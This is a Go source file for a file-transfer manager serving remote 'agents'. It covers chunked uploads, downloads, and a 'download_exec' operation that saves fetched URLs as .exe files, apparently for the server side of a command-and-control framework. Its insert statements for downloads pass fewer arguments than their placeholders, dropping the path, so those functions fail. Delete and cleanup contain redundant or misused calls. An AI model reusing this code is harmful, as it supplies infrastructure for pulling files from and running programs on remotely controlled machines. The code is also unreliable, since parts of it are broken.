package filetransfer

import (
	"context"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"
)

type FileTransfer struct {
	ID             string    `db:"id" json:"id"`
	AgentID        string    `db:"agent_id" json:"agent_id"`
	Filename       string    `db:"filename" json:"filename"`
	Path           string    `db:"path" json:"path"`
	Size           int64     `db:"size" json:"size"`
	Checksum       string    `db:"checksum" json:"checksum"`
	MimeType       string    `db:"mime_type" json:"mime_type"`
	Operation      string    `db:"operation" json:"operation"` // upload, download, download_exec
	Status         string    `db:"status" json:"status"`
	Progress       float64   `db:"progress" json:"progress"`
	ChunksTotal    int       `db:"chunks_total" json:"chunks_total"`
	ChunksReceived int       `db:"chunks_received" json:"chunks_received"`
	TempPath       string    `db:"temp_path" json:"temp_path"`
	CreatedAt      time.Time `db:"created_at" json:"created_at"`
	CompletedAt    *time.Time `db:"completed_at" json:"completed_at,omitempty"`
	Error          string    `db:"error" json:"error"`
}

type Manager struct {
	db       *sqlx.DB
	storage  string
	maxSize  int64
	chunkSize int
	mu       sync.Mutex
	transfers map[string]*FileTransfer
}

func NewManager(db *sqlx.DB, storagePath string) *Manager {
	m := &Manager{
		db:        db,
		storage:   storagePath,
		maxSize:   100 * 1024 * 1024, // 100MB
		chunkSize: 64 * 1024,         // 64KB
		transfers: make(map[string]*FileTransfer),
	}

	os.MkdirAll(storagePath, 0755)
	os.MkdirAll(filepath.Join(storagePath, "temp"), 0755)
	os.MkdirAll(filepath.Join(storagePath, "uploads"), 0755)
	os.MkdirAll(filepath.Join(storagePath, "downloads"), 0755)

	m.loadActiveTransfers()
	return m
}

func (m *Manager) loadActiveTransfers() {
	var transfers []FileTransfer
	err := m.db.Select(&transfers, "SELECT * FROM files WHERE status IN ('pending', 'transferring')")
	if err != nil {
		log.Printf("[file] Load error: %v", err)
		return
	}
	for i := range transfers {
		m.transfers[transfers[i].ID] = &transfers[i]
	}
	log.Printf("[file] Loaded %d active transfers", len(m.transfers))
}

func (m *Manager) CreateUpload(agentID, filename, remotePath string, size int64) (*FileTransfer, error) {
	if size > m.maxSize {
		return nil, fmt.Errorf("file too large: %d > %d", size, m.maxSize)
	}

	ft := &FileTransfer{
		ID:          uuid.New().String(),
		AgentID:     agentID,
		Filename:    filename,
		Path:        remotePath,
		Size:        size,
		Operation:   "upload",
		Status:      "pending",
		CreatedAt:   time.Now(),
		ChunksTotal: int((size + int64(m.chunkSize) - 1) / int64(m.chunkSize)),
		TempPath:    filepath.Join(m.storage, "temp", uuid.New().String()+".part"),
	}

	_, err := m.db.Exec(`
		INSERT INTO files (id, agent_id, filename, path, size, operation, status, chunks_total, temp_path, created_at)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`, ft.ID, ft.AgentID, ft.Filename, ft.Path, ft.Size, ft.Operation, ft.Status, ft.ChunksTotal, ft.TempPath, ft.CreatedAt)

	if err != nil {
		return nil, err
	}

	m.mu.Lock()
	m.transfers[ft.ID] = ft
	m.mu.Unlock()

	return ft, nil
}

func (m *Manager) CreateDownload(agentID, localPath, remotePath string) (*FileTransfer, error) {
	ft := &FileTransfer{
		ID:          uuid.New().String(),
		AgentID:     agentID,
		Filename:    filepath.Base(remotePath),
		Path:        remotePath,
		Operation:   "download",
		Status:      "pending",
		CreatedAt:   time.Now(),
		TempPath:    filepath.Join(m.storage, "downloads", uuid.New().String()),
	}

	_, err := m.db.Exec(`
		INSERT INTO files (id, agent_id, filename, path, size, operation, status, temp_path, created_at)
		VALUES (?, ?, ?, ?, 0, ?, ?, ?, ?)
	`, ft.ID, ft.AgentID, ft.Filename, ft.Operation, ft.Status, ft.TempPath, ft.CreatedAt)

	if err != nil {
		return nil, err
	}

	m.mu.Lock()
	m.transfers[ft.ID] = ft
	m.mu.Unlock()

	return ft, nil
}

func (m *Manager) CreateDownloadExec(agentID, url, args string) (*FileTransfer, error) {
	filename := filepath.Base(url)
	ft := &FileTransfer{
		ID:          uuid.New().String(),
		AgentID:     agentID,
		Filename:    filename,
		Path:        url,
		Operation:   "download_exec",
		Status:      "pending",
		CreatedAt:   time.Now(),
		TempPath:    filepath.Join(m.storage, "temp", uuid.New().String()+".exe"),
	}

	_, err := m.db.Exec(`
		INSERT INTO files (id, agent_id, filename, path, size, operation, status, temp_path, created_at)
		VALUES (?, ?, ?, ?, 0, ?, ?, ?, ?)
	`, ft.ID, ft.AgentID, ft.Filename, ft.Operation, ft.Status, ft.TempPath, ft.CreatedAt)

	if err != nil {
		return nil, err
	}

	m.mu.Lock()
	m.transfers[ft.ID] = ft
	m.mu.Unlock()

	return ft, nil
}

func (m *Manager) HandleChunk(agentID, taskID string, payload json.RawMessage) {
	var chunk struct {
		FileID      string `json:"file_id"`
		ChunkIndex  int    `json:"chunk_index"`
		Data        []byte `json:"data"`
		IsLast      bool   `json:"is_last"`
	}
	json.Unmarshal(payload, &chunk)

	m.mu.Lock()
	ft, ok := m.transfers[chunk.FileID]
	m.mu.Unlock()

	if !ok {
		// Load from DB
		var dbFT FileTransfer
		err := m.db.Get(&dbFT, "SELECT * FROM files WHERE id = ?", chunk.FileID)
		if err != nil {
			return
		}
		ft = &dbFT
		m.mu.Lock()
		m.transfers[chunk.FileID] = ft
		m.mu.Unlock()
	}

	if ft.AgentID != agentID {
		return
	}

	// Write chunk to temp file
	file, err := os.OpenFile(ft.TempPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Printf("[file] Open temp error: %v", err)
		return
	}
	file.Write(chunk.Data)
	file.Close()

	// Update progress
	ft.ChunksReceived++
	ft.Progress = float64(ft.ChunksReceived) / float64(ft.ChunksTotal) * 100
	ft.Status = "transferring"

	m.db.Exec("UPDATE files SET chunks_received = ?, progress = ?, status = ? WHERE id = ?",
		ft.ChunksReceived, ft.Progress, ft.Status, ft.ID)

	if chunk.IsLast || ft.ChunksReceived >= ft.ChunksTotal {
		m.finalizeTransfer(ft)
	}
}

func (m *Manager) HandleComplete(agentID, taskID string, payload json.RawMessage) {
	var complete struct {
		FileID   string `json:"file_id"`
		Checksum string `json:"checksum"`
		Size     int64  `json:"size"`
	}
	json.Unmarshal(payload, &complete)

	m.mu.Lock()
	ft, ok := m.transfers[complete.FileID]
	m.mu.Unlock()

	if !ok {
		return
	}

	if ft.AgentID != agentID {
		return
	}

	// Verify checksum
	if complete.Checksum != "" {
		actual, err := m.computeChecksum(ft.TempPath)
		if err != nil || actual != complete.Checksum {
			log.Printf("[file] Checksum mismatch for %s", ft.ID)
			m.failTransfer(ft, "Checksum mismatch")
			return
		}
		ft.Checksum = complete.Checksum
	}

	ft.Size = complete.Size
	m.finalizeTransfer(ft)
}

func (m *Manager) finalizeTransfer(ft *FileTransfer) {
	now := time.Now()
	ft.Status = "completed"
	ft.CompletedAt = &now
	ft.Progress = 100

	// Move to permanent location based on operation
	var finalPath string
	switch ft.Operation {
	case "upload":
		finalPath = filepath.Join(m.storage, "uploads", ft.AgentID, ft.Filename)
	case "download", "download_exec":
		finalPath = filepath.Join(m.storage, "downloads", ft.AgentID, ft.Filename)
	}

	os.MkdirAll(filepath.Dir(finalPath), 0755)
	os.Rename(ft.TempPath, finalPath)
	ft.TempPath = finalPath

	m.db.Exec(`
		UPDATE files SET status = ?, progress = ?, completed_at = ?, temp_path = ?, size = ?, checksum = ?
		WHERE id = ?
	`, ft.Status, ft.Progress, ft.CompletedAt, ft.TempPath, ft.Size, ft.Checksum, ft.ID)

	m.mu.Lock()
	delete(m.transfers, ft.ID)
	m.mu.Unlock()

	log.Printf("[file] Transfer completed: %s (%s)", ft.ID, ft.Operation)
}

func (m *Manager) failTransfer(ft *FileTransfer, errMsg string) {
	now := time.Now()
	ft.Status = "failed"
	ft.Error = errMsg
	ft.CompletedAt = &now

	m.db.Exec("UPDATE files SET status = ?, error = ?, completed_at = ? WHERE id = ?",
		ft.Status, ft.Error, ft.CompletedAt, ft.ID)

	os.Remove(ft.TempPath)

	m.mu.Lock()
	delete(m.transfers, ft.ID)
	m.mu.Unlock()
}

func (m *Manager) computeChecksum(path string) (string, error) {
	file, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := sha256.New()
	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}
	return fmt.Sprintf("%x", hash.Sum(nil)), nil
}

func (m *Manager) Get(id string) (*FileTransfer, error) {
	var ft FileTransfer
	err := m.db.Get(&ft, "SELECT * FROM files WHERE id = ?", id)
	return &ft, err
}

func (m *Manager) GetByAgent(agentID string) ([]*FileTransfer, error) {
	var files []*FileTransfer
	err := m.db.Select(&files, "SELECT * FROM files WHERE agent_id = ? ORDER BY created_at DESC", agentID)
	return files, err
}

func (m *Manager) GetByOperation(agentID, operation string) ([]*FileTransfer, error) {
	var files []*FileTransfer
	err := m.db.Select(&files, "SELECT * FROM files WHERE agent_id = ? AND operation = ? ORDER BY created_at DESC", agentID, operation)
	return files, err
}

func (m *Manager) Delete(id string) error {
	ft, err := m.Get(id)
	if err != nil {
		return err
	}

	os.Remove(ft.TempPath)
	if ft.Status == "completed" && ft.TempPath != "" {
		os.Remove(ft.TempPath)
	}

	_, err = m.db.Exec("DELETE FROM files WHERE id = ?", id)
	return err
}

func (m *Manager) ReadFile(id string) (io.ReadCloser, error) {
	ft, err := m.Get(id)
	if err != nil {
		return nil, err
	}

	if ft.Status != "completed" {
		return nil, fmt.Errorf("file not ready")
	}

	return os.Open(ft.TempPath)
}

func (m *Manager) CleanupTemp(ctx context.Context, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			m.cleanupOldTransfers()
		}
	}
}

func (m *Manager) GetDB() *sqlx.DB {
	return m.db
}

func (m *Manager) GetStoragePath() string {
	return m.storage
}

func (m *Manager) cleanupOldTransfers() {
	// Delete failed/pending transfers older than 1 hour
	cutoff := time.Now().Add(-1 * time.Hour)
	rows, err := m.db.Query("SELECT id, temp_path FROM files WHERE status IN ('pending', 'transferring', 'failed') AND created_at < ?", cutoff)
	if err != nil {
		return
	}
	defer rows.Close()

	for rows.Next() {
		var id, tempPath string
		rows.Scan(&id, &tempPath)
		os.Remove(tempPath)
		m.db.Exec("DELETE FROM files WHERE id = ?", id)

		m.mu.Lock()
		delete(m.transfers, id)
		m.mu.Unlock()
	}

	// Delete completed transfers older than retention period
	retention := time.Now().Add(-168 * time.Hour) // 7 days
	rows, err = m.db.Query("SELECT id, temp_path FROM files WHERE status = 'completed' AND completed_at < ?", retention)
	if err != nil {
		return
	}
	defer rows.Close()

	for rows.Next() {
		var id, tempPath string
		rows.Scan(&id, &tempPath)
		os.Remove(tempPath)
		m.db.Exec("DELETE FROM files WHERE id = ?", id)
	}
}